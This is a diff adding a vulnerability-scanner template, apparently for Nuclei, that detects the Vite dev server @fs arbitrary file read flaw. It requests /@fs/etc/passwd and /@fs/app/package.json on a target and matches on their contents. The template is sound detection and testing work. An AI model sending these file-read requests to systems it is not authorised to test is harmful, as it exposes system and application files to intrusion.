@@ -1,0 +1,33 @@
+id: vite-fs-read
+
+info:
+  name: Vite Dev Server @fs Arbitrary File Read (fingerprint)
+  author: survey-engine
+  severity: high
+  description: |
+    Vite 开发服错误暴露时 /@fs/<绝对路径> 可读本地文件。
+    本模板读取 /etc/passwd 与 /app/package.json 做指纹，不遍历敏感业务数据。
+  tags: vite,lfi,fs,devtools,fingerprint
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/@fs/etc/passwd"
+      - "{{BaseURL}}/@fs/app/package.json"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:x:0:0:"
+        name: passwd
+
+      - type: word
+        part: body
+        words:
+          - '"name"'
+          - '"dependencies"'
+        condition: and
+        name: package-json
